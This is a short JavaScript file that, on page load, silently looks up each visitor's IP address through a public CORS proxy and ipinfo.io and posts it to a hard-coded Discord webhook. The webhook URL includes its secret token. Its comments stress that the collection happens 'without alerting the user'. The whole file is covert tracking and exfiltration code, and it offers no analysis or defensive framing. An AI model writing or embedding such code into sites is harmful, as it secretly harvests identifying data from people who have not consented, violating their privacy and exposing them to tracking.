// Function to send the user's IP to the Discord webhook
function sendIp() {
    // Use a public proxy to bypass CORS
    fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://ipinfo.io/json'))
        .then(response => response.json())
        .then(data => {
            // Parse the IP data from the proxy response
            const ipData = JSON.parse(data.contents);
            const userIp = ipData.ip; // Get the user's IP address
            const webhookUrl = 'https://discord.com/api/webhooks/1320679234963767330/kujMKrXa-Zhsfyr4PANPR0BX6MWeEsV73fl4kFnKik-Qfxj3hPldZnZ4EkkCpn82A_tN';

            // Create the payload to send to the Discord webhook
            const payload = {
                content: `User IP: ${userIp}`
            };

            // Send the IP address to the Discord webhook (silent process)
            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            }).catch(error => {
                // Log any errors silently without alerting the user
                console.error('Error sending IP:', error);
            });
        })
        .catch(error => {
            // Log any errors silently without alerting the user
            console.error('Error fetching IP:', error);
        });
}

// Trigger the IP collection as soon as the page loads
window.onload = sendIp;
